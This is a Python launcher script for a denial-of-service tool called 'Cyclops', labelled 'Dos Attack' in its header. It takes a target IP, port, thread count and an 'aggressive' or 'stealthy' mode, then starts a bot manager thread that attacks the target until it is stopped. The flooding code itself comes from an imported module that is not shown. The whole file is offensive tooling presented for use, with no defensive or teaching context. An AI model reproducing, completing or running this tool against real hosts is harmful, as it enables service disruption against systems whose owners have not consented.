# Date: 01/07/2019
# Author: Mohamed
# Description: Dos Attack

from time import sleep   
from lib.args import Args 
from threading import Thread
from lib.bot import BotManager


class Cyclops:

    def __init__(self, ip, port, threads, is_aggressive):
        self.ip = ip
        self.port = port 
        self.threads = threads
        self.is_aggressive = is_aggressive
        self.bot_manager = BotManager(ip, port, threads, is_aggressive)

    def start(self):
        t = Thread(target=self.bot_manager.start)
        t.daemon = True 
        t.start()

        mode = 'Aggressive' if self.is_aggressive else 'Stealthy'
        print('Target: {}:{}\nMode: {}\nBots: {}'.format(self.ip, self.port, mode, self.threads))

        while True:
            try:
                sleep(0.5)
            except KeyboardInterrupt:
                self.stop()
                break
    
    def stop(self):
        print('Exiting ...')
        self.bot_manager.stop()
    

if __name__ == '__main__':
    args = Args()

    if args.set_args():

        cyclops = Cyclops(args.ip, args.port, args.threads, args.is_aggressive)
        cyclops.start()    